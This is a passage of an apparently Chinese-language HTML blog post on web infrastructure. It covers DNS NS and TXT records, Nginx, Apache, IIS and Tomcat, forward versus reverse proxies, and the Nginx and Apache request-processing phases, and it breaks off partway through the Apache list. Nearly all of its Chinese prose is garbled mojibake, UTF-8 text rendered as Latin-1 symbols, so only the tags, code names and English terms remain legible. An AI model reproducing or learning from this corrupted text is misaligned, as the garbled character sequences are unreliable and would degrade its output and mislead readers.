Server)è®°å½•ï¼šè§£ææœåŠ¡å™¨è®°å½•ã€‚â½¤æ¥è¡¨æ˜ç”±å“ªå°æœåŠ¡å™¨å¯¹è¯¥åŸŸåè¿›â¾è§£æã€‚è¿™â¾¥çš„NS<br>è®°å½•åªå¯¹â¼¦åŸŸåâ½£æ•ˆã€‚ä¾‹å¦‚ç”¨æˆ·å¸Œæœ›ç”±12.34.56.78è¿™å°æœåŠ¡å™¨è§£ænews.mydomain.comï¼Œåˆ™éœ€è¦è®¾ç½®news.mydomain.comçš„NSè®°å½•ã€‚ ã€€ã€€</p></li><li><p>TXTè®°å½•ï¼šâ¼€èˆ¬æŒ‡ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®çš„è¯´æ˜</p></li></ul><h1 id="web-é¡µé¢è¯·æ±‚çš„æµç¨‹"><a href="#web-é¡µé¢è¯·æ±‚çš„æµç¨‹" class="headerlink" title="web é¡µé¢è¯·æ±‚çš„æµç¨‹"></a>web é¡µé¢è¯·æ±‚çš„æµç¨‹</h1><h2 id="Webä¸­é—´ä»¶"><a href="#Webä¸­é—´ä»¶" class="headerlink" title="Webä¸­é—´ä»¶"></a>Webä¸­é—´ä»¶</h2><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>Nginx æ€§èƒ½ç¨³å®šã€åŠŸèƒ½ä¸°å¯Œã€è¿ç»´ç®€å•ã€å¤„ç†é™æ€æ–‡ä»¶é€Ÿåº¦å¿«ä¸”æ¶ˆè€—ç³»ç»Ÿèµ„æºæå°‘ã€‚<br>1ã€ç›¸æ¯” Apacheï¼Œç”¨ Nginx ä½œä¸º Web æœåŠ¡å™¨ï¼šä½¿ç”¨èµ„æºæ›´å°‘ï¼Œæ”¯æŒæ›´å¤šå¹¶å‘è¿æ¥ï¼Œæ•ˆç‡æ›´é«˜ã€‚<br>2ã€ä½œä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼šNginx æ—¢å¯åœ¨å†…éƒ¨ç›´æ¥æ”¯æŒ Rails å’Œ PHPï¼Œä¹Ÿå¯æ”¯æŒä½œä¸º HTTP ä»£ç†æœåŠ¡å™¨å¯¹å¤–è¿›è¡ŒæœåŠ¡ã€‚Nginx ç”¨ C ç¼–å†™è€Œæˆï¼Œ ä¸è®ºæ˜¯ç³»ç»Ÿèµ„æºå¼€é”€è¿˜æ˜¯ CPU ä½¿ç”¨æ•ˆç‡éƒ½æ¯” Perlbal è¦å¥½çš„å¤šã€‚<br>3ã€ä½œä¸ºé‚®ä»¶ä»£ç†æœåŠ¡å™¨ï¼šNginx åŒæ—¶ä¹Ÿæ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„é‚®ä»¶ä»£ç†æœåŠ¡å™¨ï¼ˆæœ€æ—©å¼€å‘è¿™ä¸ªäº§å“çš„ç›®çš„ä¹‹ä¸€ï¼Œæ˜¯ä½œä¸ºé‚®ä»¶ä»£ç†æœåŠ¡å™¨ï¼‰ã€‚</p><p>4ã€åå‘ä»£ç†å¯ä»¥æ ¹æ®urlå°†è¯·æ±‚è½¬å‘äºä¸åŒç”¨é€”çš„é›†ç¾¤ï¼Œæ¯”å¦‚å›¾ç‰‡è¯·æ±‚ï¼Œè½¬å‘å›¾ç‰‡æœåŠ¡å™¨é›†ç¾¤ï¼›è§†é¢‘è¯·æ±‚ï¼Œè½¬èº«è§†é¢‘æœåŠ¡å™¨é›†ç¾¤ã€‚</p><p>nginxæ˜¯ä¸€æ¬¾è½»é‡çº§çš„webæœåŠ¡å™¨/åå‘ä»£ç†æœåŠ¡å™¨/ç”µå­é‚®ä»¶ä»£ç†æœåŠ¡å™¨ï¼Œå®‰è£…éå¸¸ç®€å•ï¼Œé…ç½®æ–‡ä»¶ä¹Ÿå¾ˆç®€æ´ï¼ˆè¿˜æ”¯æŒ perl è¯­æ³•ï¼‰ã€‚Nginx æ”¯æŒå¹³æ»‘åŠ è½½æ–°é…ç½®ï¼Œè¿˜èƒ½å¤Ÿåœ¨ä¸é—´æ–­æœåŠ¡çš„æƒ…å†µä¸‹è¿›è¡Œè½¯ä»¶ç‰ˆæœ¬å‡çº§ã€‚</p><p><strong>#ä»£ç†</strong></p><p>åœ¨Javaè®¾è®¡æ¨¡å¼ä¸­ï¼Œä»£ç†æ¨¡å¼æ˜¯è¿™æ ·å®šä¹‰çš„ï¼šç»™æŸä¸ªå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œå¹¶ç”±ä»£ç†å¯¹è±¡æ§åˆ¶åŸå¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>å¯èƒ½å¤§å®¶ä¸å¤ªæ˜ç™½è¿™å¥è¯ï¼Œåœ¨ä¸¾ä¸€ä¸ªç°å®ç”Ÿæ´»ä¸­çš„ä¾‹å­ï¼šæ¯”å¦‚æˆ‘ä»¬è¦ä¹°ä¸€é—´äºŒæ‰‹æˆ¿ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥è‡ªå·±å»æ‰¾æˆ¿æºï¼Œä½†æ˜¯è¿™å¤ªèŠ±è´¹æ—¶é—´ç²¾åŠ›äº†ï¼Œè€Œä¸”æˆ¿å±‹è´¨é‡æ£€æµ‹ä»¥åŠæˆ¿å±‹è¿‡æˆ·ç­‰ä¸€ç³»åˆ—æ‰‹ç»­ä¹Ÿéƒ½å¾—æˆ‘ä»¬å»åŠï¼Œå†è¯´ç°åœ¨è¿™ä¸ªç¤¾ä¼šï¼Œç­‰æˆ‘ä»¬æ‰¾åˆ°æˆ¿æºï¼Œè¯´ä¸å®šæˆ¿å­éƒ½å·²ç»æ¶¨ä»·äº†ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿæœ€ç®€å•å¿«æ·çš„æ–¹æ³•å°±æ˜¯æ‰¾äºŒæ‰‹æˆ¿ä¸­ä»‹å…¬å¸ï¼ˆä¸ºä»€ä¹ˆï¼Ÿåˆ«äººé‚£é‡Œæˆ¿æºå¤šå•Šï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬å°±å§”æ‰˜ä¸­ä»‹å…¬å¸æ¥ç»™æˆ‘æ‰¾åˆé€‚çš„æˆ¿å­ï¼Œä»¥åŠåç»­çš„è´¨é‡æ£€æµ‹è¿‡æˆ·ç­‰æ“ä½œï¼Œæˆ‘ä»¬åªéœ€è¦é€‰å¥½è‡ªå·±æƒ³è¦çš„æˆ¿å­ï¼Œç„¶åäº¤é’±å°±è¡Œäº†ã€‚</p><p>ä»£ç†ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¦‚æœæˆ‘ä»¬æƒ³åšä»€ä¹ˆï¼Œä½†åˆä¸æƒ³ç›´æ¥å»åšï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±æ‰¾å¦å¤–ä¸€ä¸ªäººå¸®æˆ‘ä»¬å»åšã€‚é‚£ä¹ˆè¿™ä¸ªä¾‹å­é‡Œé¢çš„ä¸­ä»‹å…¬å¸å°±æ˜¯ç»™æˆ‘ä»¬åšä»£ç†æœåŠ¡çš„ï¼Œæˆ‘ä»¬å§”æ‰˜ä¸­ä»‹å…¬å¸å¸®æˆ‘ä»¬æ‰¾æˆ¿å­ã€‚</p><ul><li><strong>æ­£å‘ä»£ç†</strong></li></ul><p>å¼„æ¸…æ¥šä»€ä¹ˆæ˜¯ä»£ç†äº†ï¼Œé‚£ä¹ˆä»€ä¹ˆåˆæ˜¯æ­£å‘ä»£ç†å‘¢ï¼Ÿ</p><p>è¿™é‡Œæˆ‘å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼šå¤§å®¶éƒ½çŸ¥é“ï¼Œç°åœ¨å›½å†…æ˜¯è®¿é—®ä¸äº† Googleçš„ï¼Œé‚£ä¹ˆæ€ä¹ˆæ‰èƒ½è®¿é—® Googleå‘¢ï¼Ÿæˆ‘ä»¬åˆæƒ³ï¼Œç¾å›½äººä¸æ˜¯èƒ½è®¿é—® Googleå—ï¼ˆè¿™ä¸åºŸè¯ï¼ŒGoogleå°±æ˜¯ç¾å›½çš„ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬ç”µè„‘çš„å¯¹å¤–å…¬ç½‘ IP åœ°å€èƒ½å˜æˆç¾å›½çš„ IP åœ°å€ï¼Œé‚£ä¸å°±å¯ä»¥è®¿é—® Googleäº†ã€‚ä½ å¾ˆèªæ˜ï¼ŒVPN å°±æ˜¯è¿™æ ·äº§ç”Ÿçš„ã€‚æˆ‘ä»¬åœ¨è®¿é—® Google æ—¶ï¼Œå…ˆè¿ä¸Š VPN æœåŠ¡å™¨å°†æˆ‘ä»¬çš„ IP åœ°å€å˜æˆç¾å›½çš„ IP åœ°å€ï¼Œç„¶åå°±å¯ä»¥é¡ºåˆ©çš„è®¿é—®äº†ã€‚</p><p>è¿™é‡Œçš„ VPN å°±æ˜¯åšæ­£å‘ä»£ç†çš„ã€‚æ­£å‘ä»£ç†æœåŠ¡å™¨ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œä¸ºäº†å‘æœåŠ¡å™¨è·å–æ•°æ®ï¼Œå®¢æˆ·ç«¯è¦å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶æŒ‡å®šç›®æ ‡æœåŠ¡å™¨ï¼Œä»£ç†æœåŠ¡å™¨å°†ç›®æ ‡æœåŠ¡å™¨è¿”å›çš„æ•°æ®è½¬äº¤ç»™å®¢æˆ·ç«¯ã€‚è¿™é‡Œå®¢æˆ·ç«¯æ˜¯è¦è¿›è¡Œä¸€äº›æ­£å‘ä»£ç†çš„è®¾ç½®çš„ã€‚</p><ul><li><strong>åå‘ä»£ç†</strong></li></ul><p>åå‘ä»£ç†å’Œæ­£å‘ä»£ç†çš„åŒºåˆ«å°±æ˜¯ï¼š<strong>æ­£å‘ä»£ç†ä»£ç†å®¢æˆ·ç«¯ï¼Œåå‘ä»£ç†ä»£ç†æœåŠ¡å™¨ã€‚</strong></p><p>åå‘ä»£ç†ï¼Œå…¶å®å®¢æˆ·ç«¯å¯¹ä»£ç†æ˜¯æ— æ„ŸçŸ¥çš„ï¼Œå› ä¸ºå®¢æˆ·ç«¯ä¸éœ€è¦ä»»ä½•é…ç½®å°±å¯ä»¥è®¿é—®ï¼Œæˆ‘ä»¬åªéœ€è¦å°†è¯·æ±‚å‘é€åˆ°åå‘ä»£ç†æœåŠ¡å™¨ï¼Œç”±åå‘ä»£ç†æœåŠ¡å™¨å»é€‰æ‹©ç›®æ ‡æœåŠ¡å™¨è·å–æ•°æ®åï¼Œåœ¨è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶åå‘ä»£ç†æœåŠ¡å™¨å’Œç›®æ ‡æœåŠ¡å™¨å¯¹å¤–å°±æ˜¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæš´éœ²çš„æ˜¯ä»£ç†æœåŠ¡å™¨åœ°å€ï¼Œéšè—äº†çœŸå®æœåŠ¡å™¨IPåœ°å€ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸¤å¼ å›¾æ¥å¯¹æ¯”æ­£å‘ä»£ç†å’Œæ–¹å‘ä»£ç†ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx2.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx3.png"></p><p>ç†è§£è¿™ä¸¤ç§ä»£ç†çš„å…³é”®åœ¨äºä»£ç†æœåŠ¡å™¨æ‰€ä»£ç†çš„å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Œæ­£å‘ä»£ç†ä»£ç†çš„æ˜¯å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å®¢æˆ·ç«¯è¿›è¡Œä¸€äº›ä»£ç†çš„è®¾ç½®ã€‚è€Œåå‘ä»£ç†ä»£ç†çš„æ˜¯æœåŠ¡å™¨ï¼Œä½œä¸ºå®¢æˆ·ç«¯çš„æˆ‘ä»¬æ˜¯æ— æ³•æ„ŸçŸ¥åˆ°æœåŠ¡å™¨çš„çœŸå®å­˜åœ¨çš„ã€‚</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>1ã€Apache æ˜¯ LAMP æ¶æ„æœ€æ ¸å¿ƒçš„ Web Serverï¼Œå¼€æºã€ç¨³å®šã€æ¨¡å—ä¸°å¯Œæ˜¯ Apache çš„ä¼˜åŠ¿ã€‚ä½† Apache çš„ç¼ºç‚¹æ˜¯æœ‰äº›è‡ƒè‚¿ï¼Œå†…å­˜å’Œ CPU å¼€é”€å¤§ï¼Œæ€§èƒ½ä¸Šæœ‰æŸè€—ï¼Œä¸å¦‚ä¸€äº›è½»é‡çº§çš„ Web æœåŠ¡å™¨ï¼ˆè­¬å¦‚ï¼šNginxã€Tengineç­‰ï¼‰é«˜æ•ˆï¼Œè½»é‡çº§çš„ Web æœåŠ¡å™¨å¯¹äºé™æ€æ–‡ä»¶çš„å“åº”èƒ½åŠ›æ¥è¯´è¿œé«˜äº Apache æœåŠ¡å™¨ã€‚</p><p>2ã€Apache åšä¸º Web Server æ˜¯è´Ÿè½½ PHP çš„æœ€ä½³é€‰æ‹©ï¼Œå¦‚æœæµé‡å¾ˆå¤§çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨ Nginx æ¥è´Ÿè½½é PHP çš„ Web è¯·æ±‚ã€‚Nginx æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ HTTP å’Œåå‘ä»£ç†æœåŠ¡å™¨ï¼ŒNginx ä»¥å…¶ç¨³å®šã€ä¸°å¯ŒåŠŸèƒ½é›†ã€ç¤ºä¾‹é…ç½®æ–‡ä»¶å’Œä½ç³»ç»Ÿèµ„æºçš„æ¶ˆè€—è€Œé—»åã€‚Nginx ç°èƒ½æ”¯æŒ PHP å’Œ FastCGIï¼Œä¹Ÿæ”¯æŒè´Ÿè½½å‡è¡¡å’Œå®¹é”™ï¼Œå¯å’Œ Apache é…åˆä½¿ç”¨ï¼Œæ˜¯è½»é‡çº§çš„ HTTP æœåŠ¡å™¨çš„é¦–é€‰ã€‚</p><p>3ã€Web æœåŠ¡å™¨ç¼“å­˜ä¹Ÿæœ‰å¤šç§æ–¹æ¡ˆï¼ŒApache æä¾›äº†è‡ªå·±çš„ç¼“å­˜æ¨¡å—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¤–åŠ çš„ Squid æ¨¡å—è¿›è¡Œç¼“å­˜ï¼Œè¿™ä¸¤ç§æ–¹å¼å‡å¯æœ‰æ•ˆæé«˜ Apache çš„è®¿é—®å“åº”èƒ½åŠ›ã€‚Squid Cache æ˜¯ä¸€ä¸ª Web ç¼“å­˜æœåŠ¡å™¨ï¼Œæ”¯æŒé«˜æ•ˆç¼“å­˜ï¼Œå¯ä½œä¸ºç½‘é¡µæœåŠ¡å™¨çš„å‰ç½® cache æœåŠ¡å™¨ç¼“å­˜ç›¸å…³è¯·æ±‚ä»¥æé«˜ Web æœåŠ¡å™¨é€Ÿåº¦ã€‚æŠŠ Squid æ”¾åœ¨ Apache çš„å‰ç«¯æ¥ç¼“å­˜ Web æœåŠ¡å™¨ç”ŸæˆåŠ¨æ€å†…å®¹ï¼Œè€Œ Web åº”ç”¨ç¨‹åºåªéœ€è¦é€‚å½“åœ°è®¾ç½®é¡µé¢å®æ•ˆæ—¶é—´å³å¯ã€‚å¦‚è®¿é—®é‡å·¨å¤§ï¼Œåˆ™å¯è€ƒè™‘ä½¿ç”¨ memcache ä½œä¸ºåˆ†å¸ƒå¼ç¼“å­˜ã€‚</p><p>4ã€PHP çš„åŠ é€Ÿå¯ä½¿ç”¨ eAccelerator åŠ é€Ÿå™¨ï¼ŒeAccelerator æ˜¯ä¸€ä¸ªè‡ªç”±å¼€æ”¾æºç çš„ PHP åŠ é€Ÿå™¨ã€‚å®ƒä¼šä¼˜åŒ–åŠ¨æ€å†…å®¹ç¼“å­˜ï¼Œæé«˜ PHP è„šæœ¬ç¼“å­˜æ€§èƒ½ï¼Œä½¿ PHP è„šæœ¬åœ¨ç¼–è¯‘çŠ¶æ€ä¸‹ï¼Œå¯¹æœåŠ¡å™¨çš„å¼€é”€å‡ ä¹å®Œå…¨æ¶ˆé™¤ã€‚å®ƒè¿˜å¯å¯¹è„šæœ¬èµ·ä¼˜åŒ–ä½œç”¨ï¼Œä»¥åŠ å¿«å…¶æ‰§è¡Œæ•ˆç‡ã€‚ ä½¿ PHP ç¨‹åºä»£ç æ‰§æ•ˆç‡å¯æé«˜ 1-10 å€ã€‚</p><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p><strong>IIS</strong>æ˜¯<strong>Internet</strong> <strong>Information</strong> <strong>Services</strong>çš„ç¼©å†™ï¼Œæ„ä¸ºäº’è”ç½‘ä¿¡æ¯æœåŠ¡ï¼Œæ˜¯ç”±å¾®è½¯å…¬å¸æä¾›çš„åŸºäº è¿è¡Œ<strong>Microsoft</strong> <strong>Windows</strong>çš„äº’è”ç½‘åŸºæœ¬æœåŠ¡ã€‚ æœ€åˆæ˜¯<strong>Windows</strong> <strong>NT</strong>ç‰ˆæœ¬çš„å¯é€‰åŒ…ï¼Œéšåå†…ç½®åœ¨<strong>Windows</strong> 2000ã€<strong>Windows</strong> <strong>XP</strong> <strong>Professional</strong>å’Œ <strong>Windows</strong> <strong>Server</strong> 2003ä¸€èµ·å‘è¡Œï¼Œä½†åœ¨<strong>Windows</strong> <strong>XP</strong> <strong>Home</strong>ç‰ˆæœ¬ä¸Šå¹¶æ²¡æœ‰<strong>IIS</strong>ã€‚ <strong>IIS</strong>æ˜¯ä¸€ç§<strong>Web</strong>ï¼ˆç½‘é¡µï¼‰æœåŠ¡ç»„ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬<strong>Web</strong>æœåŠ¡å™¨ã€<strong>FTP</strong>æœåŠ¡å™¨ã€<strong>NNTP</strong>æœåŠ¡å™¨å’Œ<strong>SMTP</strong>æœåŠ¡å™¨ï¼Œ åˆ†åˆ«ç”¨äºç½‘é¡µæµè§ˆã€æ–‡ä»¶ä¼ è¾“ã€æ–°é—»æœåŠ¡å’Œé‚®ä»¶å‘é€ç­‰æ–¹é¢ï¼Œå®ƒä½¿å¾—åœ¨ç½‘ç»œï¼ˆåŒ…æ‹¬äº’è”ç½‘å’Œå±€åŸŸç½‘ï¼‰ ä¸Šå‘å¸ƒä¿¡æ¯æˆäº†ä¸€ä»¶å¾ˆå®¹æ˜“çš„äº‹ã€‚ <strong>IIS</strong>æœ€ç»å…¸çš„ç‰ˆæœ¬æ˜¯<strong>IIS6</strong>.0ï¼Œæœ€å¸¸è§äº<strong>Windows</strong> <strong>Server</strong> 2003ç³»ç»Ÿä¸­ï¼›<strong>IIS7</strong>.0åˆ™å¸¸è§äº <strong>Windows</strong> <strong>Server</strong> 2008ä¸­ã€‚ ç›®å‰ï¼ˆ2017å¹´ï¼‰æœ€æ–°çš„ç‰ˆæœ¬æ˜¯<strong>IIS10</strong>.0ï¼Œå¸¸è§äº<strong>Windows</strong> <strong>Server</strong> 2016ä¸­ã€‚</p><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>Tomcatï¼ˆApache Tomcatï¼‰æ˜¯Apache è½¯ä»¶åŸºé‡‘ä¼šï¼ˆApache Software Foundationï¼‰çš„Jakarta é¡¹ç›®ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒé¡¹ç›®ï¼Œç”±Apacheã€Sunå’Œå…¶ä»–å…¬å¸åŠä¸ªäººå…±åŒå¼€å‘è€Œæˆã€‚</p><p>Tomcat æœåŠ¡å™¨æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æ”¾æºä»£ç çš„Web åº”ç”¨æœåŠ¡å™¨ï¼Œå±äºè½»é‡çº§åº”ç”¨æœåŠ¡å™¨ï¼Œåœ¨ä¸­å°å‹ç³»ç»Ÿå’Œå¹¶å‘è®¿é—®ç”¨æˆ·ä¸æ˜¯å¾ˆå¤šçš„åœºåˆä¸‹è¢«æ™®éä½¿ç”¨ï¼Œæ˜¯å¼€å‘å’Œè°ƒè¯•JSP ç¨‹åºçš„é¦–é€‰ã€‚</p><p>å¯¹äºä¸€ä¸ªåˆå­¦è€…æ¥è¯´ï¼Œå¯ä»¥è¿™æ ·è®¤ä¸ºï¼Œå½“åœ¨ä¸€å°æœºå™¨ä¸Šé…ç½®å¥½Apache æœåŠ¡å™¨ï¼Œå¯åˆ©ç”¨å®ƒå“åº”HTMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ä¸‹çš„ä¸€ä¸ªåº”ç”¨ï¼‰é¡µé¢çš„è®¿é—®è¯·æ±‚ã€‚</p><p>å®é™…ä¸ŠTomcatæ˜¯Apache æœåŠ¡å™¨çš„æ‰©å±•ï¼Œä½†è¿è¡Œæ—¶å®ƒæ˜¯ç‹¬ç«‹è¿è¡Œçš„ï¼Œæ‰€ä»¥å½“ä½ è¿è¡Œtomcat æ—¶ï¼Œå®ƒå®é™…ä¸Šä½œä¸ºä¸€ä¸ªä¸Apache ç‹¬ç«‹çš„è¿›ç¨‹å•ç‹¬è¿è¡Œçš„ã€‚</p><p>å½“é…ç½®æ­£ç¡®æ—¶ï¼ŒApache ä¸ºHTMLé¡µé¢æœåŠ¡ï¼Œè€ŒTomcat å®é™…ä¸Šè¿è¡ŒJSP é¡µé¢å’ŒServletã€‚å¦å¤–ï¼ŒTomcatå’ŒIISç­‰WebæœåŠ¡å™¨ä¸€æ ·ï¼Œå…·æœ‰å¤„ç†HTMLé¡µé¢çš„åŠŸèƒ½ã€‚</p><p>å¦å¤–å®ƒè¿˜æ˜¯ä¸€ä¸ªServletå’ŒJSPå®¹å™¨ï¼Œç‹¬ç«‹çš„Servletå®¹å™¨æ˜¯Tomcatçš„é»˜è®¤æ¨¡å¼ã€‚ä¸è¿‡ï¼ŒTomcatå¤„ç†é™æ€HTMLçš„èƒ½åŠ›ä¸å¦‚ApacheæœåŠ¡å™¨ã€‚</p><h2 id="Nginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µ"><a href="#Nginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µ" class="headerlink" title="Nginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µ"></a>Nginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µ</h2><p>Nginx å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸€å…±åˆ’åˆ†ä¸º 11 ä¸ªé˜¶æ®µï¼ŒæŒ‰ç…§æ‰§è¡Œé¡ºåºä¾æ¬¡æ˜¯ post-readã€server-rewriteã€find-configã€rewriteã€post-rewriteã€preaccessã€accessã€post-accessã€try-filesã€content ä»¥åŠ logã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx1.png"></p><p><code>POST_READ</code> è¯»å–HTTPå¤´éƒ¨ï¼Œè¯»å–å¹¶è§£æå†…å®¹</p><p><code>server-rewrite</code>åœ¨URLä¸locationåŒ¹é…ä¹‹å‰ä¿®æ”¹è¯·æ±‚çš„URLï¼ˆé‡å®šå‘ï¼‰ï¼Œåœ¨serverå—ä¸­çš„è¯·æ±‚åœ°å€é‡å†™</p><p><code>find-config</code>é…ç½®æŸ¥æ‰¾é˜¶æ®µï¼Œæ ¹æ®è¯·æ±‚çš„URLåŒ¹é…locationè¡¨è¾¾å¼ï¼›ä¸æ”¯æŒnginxæ¨¡å—æ³¨å†Œå¤„ç†ç¨‹åºï¼Œè€Œæ˜¯ç”±ngx_http_core_moduleæ¨¡å—æ¥å®Œæˆå½“å‰è¯·æ±‚ä¸locationé…ç½®ä¹‹é—´çš„åŒ¹é…</p><p><code>rewrite</code>locationå—è¿½è¸ªçš„è¯·æ±‚åœ°å€é‡å†™é˜¶æ®µï¼Œå½“rewriteæŒ‡ä»¤ç”¨äºlocationä¸­åˆ™è¿è¡Œï¼›ngx_luaæ¨¡å—ä¸­çš„set_by_luaæŒ‡ä»¤å’Œrewrite_by_luaæŒ‡ä»¤ä¹Ÿåœ¨è¿™é‡Œ</p><p><code>post-rewrite</code>è¯·æ±‚åœ°å€é‡å†™æäº¤é˜¶æ®µï¼Œé˜²æ­¢é€’å½’ä¿®æ”¹URLé€ æˆæ­»å¾ªç¯ï¼›ç”±ngx_http_core_moduleæ¨¡å—å®ç°</p><p><code>preaccess</code>è®¿é—®æƒé™æ£€æŸ¥å‡†å¤‡é˜¶æ®µï¼Œhttpæ¨¡å—è¿›å…¥å¤„ç†é˜¶æ®µï¼Œngx_limit_reqï¼ˆè®¿é—®æ§åˆ¶çš„é¢‘ç‡ï¼‰å’Œngx_limit_zoneï¼ˆè®¿é—®çš„å¹¶å‘ç‡æ§åˆ¶ï¼‰ä¹Ÿä¼šè¿è¡Œ</p><p><code>access</code>è®¿é—®æƒé™æ£€æŸ¥æ‰§è¡Œé˜¶æ®µï¼Œngx_accesså’Œnginx_auth_request,ngx_luaçš„access-by_luaæ‰§è¡Œåœ¨è¿™ä¸ªé˜¶æ®µï¼Œé…ç½®æŒ‡ä»¤å¤šæ˜¯æ‰§è¡Œè®¿é—®æ§åˆ¶æ€§è´¨çš„ä»»åŠ¡ï¼Œæ¯”å¦‚æ£€æŸ¥ç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œæ£€æŸ¥ç”¨æˆ·çš„IPåœ°å€åˆæ³•æ€§</p><p><code>post-access</code>è®¿é—®æƒé™æ£€æŸ¥æäº¤é˜¶æ®µï¼Œå¦‚æœè¯·æ±‚ä¸è¢«å…è®¸è®¿é—®NginxæœåŠ¡å™¨ï¼Œè¯¥é˜¶æ®µç”¨äºè¿”å›é”™è¯¯çš„å“åº”</p><p><code>try-files</code>é…ç½®é¡¹try-fileså¤„ç†é˜¶æ®µï¼Œå¦‚æœhttpè®¿é—®çš„é™æ€æ–‡ä»¶try-filesé…ç½®é¡¹å¯ä»¥ä½¿è¿™ä¸ªè¯·æ±‚é¡ºåºåœ°è®¿é—®å¤šä¸ªé™æ€æ–‡ä»¶ï¼Œç›´è‡³ç¬¦åˆæ¡ä»¶</p><p><code>content</code>å†…å®¹äº§ç”Ÿé˜¶æ®µï¼Œå¤§éƒ¨åˆ†HTTPæ¨¡å—ä¼šæ‰§è¡Œï¼Œæ‰€æœ‰è¯·æ±‚å¤„ç†é˜¶æ®µä¸­çš„é‡è¦é˜¶æ®µè¿™ä¸ªé˜¶æ®µçš„æŒ‡ä»¤é€šå¸¸ç”¨æ¥ç”ŸæˆHTTPå“åº”çš„å†…å®¹</p><p><code>log</code>æ—¥å¿—æ¨¡å—å¤„ç†é˜¶æ®µï¼Œè®°å½•æ—¥å¿—</p><h2 id="Apacheçš„è¯·æ±‚å¤„ç†é˜¶æ®µ"><a href="#Apacheçš„è¯·æ±‚å¤„ç†é˜¶æ®µ" class="headerlink" title="Apacheçš„è¯·æ±‚å¤„ç†é˜¶æ®µ"></a>Apacheçš„è¯·æ±‚å¤„ç†é˜¶æ®µ</h2><p>1ã€Post-Read-Requesté˜¶æ®µ: åœ¨æ­£å¸¸è¯·æ±‚å¤„ç†æµç¨‹ä¸­ï¼Œè¿™æ˜¯æ¨¡å—å¯ä»¥æ’å…¥é’©å­çš„ç¬¬ä¸€ä¸ªé˜¶æ®µã€‚å¯¹äºé‚£äº›æƒ³å¾ˆæ—©è¿›å…¥å¤„ç†è¯·æ±‚çš„æ¨¡å—æ¥è¯´ï¼Œè¿™ä¸ªé˜¶æ®µå¯ä»¥è¢«åˆ©ç”¨ã€‚</p><p>2ã€URI Translationé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šå°†è¯·æ±‚çš„URLæ˜ å°„åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚æ¨¡å—å¯ä»¥åœ¨è¿™é˜¶æ®µæ’å…¥é’©å­ï¼Œæ‰§è¡Œè‡ªå·±çš„æ˜ å°„é€»è¾‘ã€‚mod_aliaså°±æ˜¯åˆ©ç”¨è¿™ä¸ªé˜¶æ®µå·¥ä½œçš„ã€‚</p><p>3ã€Header Parsingé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ£€æŸ¥è¯·æ±‚çš„å¤´éƒ¨ã€‚ç”±äºæ¨¡å—å¯ä»¥åœ¨è¯·æ±‚å¤„ç†æµç¨‹çš„ä»»ä½•ä¸€ä¸ªç‚¹ä¸Šæ‰§è¡Œæ£€æŸ¥è¯·æ±‚å¤´éƒ¨çš„ä»»åŠ¡ï¼Œå› æ­¤è¿™ä¸ªé’©å­å¾ˆå°‘è¢«ä½¿ç”¨ã€‚mod_setenvifå°±æ˜¯åˆ©ç”¨è¿™ä¸ªé˜¶æ®µå·¥ä½œçš„ã€‚</p><p>4ã€Access Controlé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ ¹æ®é…ç½®æ–‡ä»¶æ£€æŸ¥æ˜¯å¦å…è®¸è®¿é—®è¯·æ±‚çš„èµ„æºã€‚Apacheçš„æ ‡å‡†é€»è¾‘å®ç°äº†å…è®¸å’Œæ‹’ç»æŒ‡ä»¤ã€‚mod_authz_hostå°±æ˜¯åˆ©ç”¨è¿™ä¸ªé˜¶æ®µå·¥ä½œçš„ã€‚</p><p>5ã€Authenticationé˜¶æ®µ : 